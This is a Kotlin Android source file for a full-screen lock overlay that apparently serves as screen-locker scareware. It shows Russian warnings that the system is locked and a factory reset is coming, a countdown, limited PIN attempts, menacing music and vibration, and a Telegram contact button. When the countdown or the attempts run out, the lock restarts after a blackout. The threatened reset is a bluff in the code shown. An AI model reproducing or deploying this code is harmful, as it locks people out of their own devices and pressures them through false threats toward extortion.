package com.rocket.deadlinelock

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.os.Vibrator
import android.os.VibrationEffect
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlay(private val context: Context) {
    private val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private val music = ScaryMusic()

    private var view: LinearLayout? = null
    private var timerText: TextView? = null
    private var attemptsText: TextView? = null
    private var input: EditText? = null
    private var btn: Button? = null

    private val correctPin = "fghmb"
    private var attemptsLeft = 5
    private var secondsLeft = 5 * 60
    private var lockedOut = false

    private val tick = object : Runnable {
        override fun run() {
            if (lockedOut) return
            secondsLeft--
            if (secondsLeft <= 0) {
                timerText?.text = "ВРЕМЯ ВЫШЛО"
                goBlackout()
                return
            }
            timerText?.text = String.format("ОСТАЛОСЬ: %02d:%02d",
                secondsLeft / 60, secondsLeft % 60)
            handler.postDelayed(this, 1000)
        }
    }

    fun show() {
        if (view != null) return
        
        // Главный контейнер (темный фон)
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#050000"))
            setPadding(50, 50, 50, 50)
        }

        // Иконка черепа / предупреждения
        val icon = TextView(context).apply {
            text = "☠"
            setTextColor(Color.parseColor("#FF0000"))
            textSize = 64f
            gravity = Gravity.CENTER
            setShadowLayer(15f, 0f, 0f, Color.RED)
        }

        val title = TextView(context).apply {
            text = "СИСТЕМА ЗАБЛОКИРОВАНА"
            setTextColor(Color.WHITE)
            textSize = 24f
            setShadowLayer(10f, 0f, 0f, Color.RED)
            gravity = Gravity.CENTER
            setPadding(0, 10, 0, 20)
        }

        val warn = TextView(context).apply {
            text = "ФАБРИЧНЫЙ СБРОС ЧЕРЕЗ:"
            setTextColor(Color.parseColor("#AA0000"))
            textSize = 16f
            gravity = Gravity.CENTER
        }

        timerText = TextView(context).apply {
            text = "05:00"
            setTextColor(Color.parseColor("#FF4444"))
            textSize = 48f
            gravity = Gravity.CENTER
            setShadowLayer(20f, 0f, 0f, Color.RED)
            setPadding(0, 0, 0, 20)
        }

        val warn2 = TextView(context).apply {
            text = "ПОПЫТОК ВВОДА:"
            setTextColor(Color.parseColor("#AA0000"))
            textSize = 16f
            gravity = Gravity.CENTER
        }

        attemptsText = TextView(context).apply {
            text = "5"
            setTextColor(Color.WHITE)
            textSize = 28f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 30)
        }

        input = EditText(context).apply {
            hint = "ВВЕДИТЕ КОД"
            setTextColor(Color.WHITE)
            setHintTextColor(Color.parseColor("#555555"))
            gravity = Gravity.CENTER
            textSize = 20f
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            
            // Красивая рамка для поля ввода
            val bg = GradientDrawable().apply {
                setColor(Color.TRANSPARENT)
                setStroke(4, Color.parseColor("#880000"))
                cornerRadius = 15f
            }
            background = bg
            setPadding(20, 20, 20, 20)
        }

        btn = Button(context).apply {
            text = "РАЗБЛОКИРОВАТЬ"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#880000"))
            setPadding(20, 20, 20, 20)
            setOnClickListener { checkPassword() }
        }

        // Кнопки Telegram и VPN (в самом низу)
        val tgBtn = Button(context).apply {
            text = "TG: @qwerty112005"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#4444FF"))
            setOnClickListener {
                if (!AppLauncher.openTelegram(context))
                    attemptsText?.text = "TG не найден"
            }
        }

        val vpnBtn = Button(context).apply {
            text = "ОТКРЫТЬ VPN"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#4444FF"))
            setOnClickListener {
                if (!AppLauncher.openVpn(context))
                    attemptsText?.text = "VPN не найден"
            }
        }

        root.addView(icon)
        root.addView(title)
        root.addView(warn)
        root.addView(timerText)
        root.addView(warn2)
        root.addView(attemptsText)
        root.addView(input)
        root.addView(btn)
        root.addView(tgBtn)
        root.addView(vpnBtn)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        wm.addView(root, params)
        view = root

        music.start()
        handler.postDelayed(tick, 1000)
    }

    private fun checkPassword() {
        if (lockedOut) return
        if (input?.text.toString() == correctPin) unlock()
        else {
            attemptsLeft--
            attemptsText?.text = attemptsLeft.toString()
            input?.setText("")
            vibrate(400)
            if (attemptsLeft <= 0) {
                attemptsText?.text = "0 (СБРОС)"
                goBlackout()
            }
        }
    }

    private fun goBlackout() {
        if (lockedOut) return
        lockedOut = true
        handler.removeCallbacksAndMessages(null)
        music.stop()
        vibrate(1500)
        hide()
        BlackoutOverlay(context).start {
            attemptsLeft = 5
            lockedOut = false
            secondsLeft = 5 * 60
            show()
        }
    }

    private fun unlock() {
        handler.removeCallbacksAndMessages(null)
        music.stop()
        hide()
    }

    fun hide() {
        view?.let { try { wm.removeView(it) } catch (_: Exception) {} }
        view = null
    }

    private fun vibrate(ms: Long) {
        val v = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator ?: return
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }
}
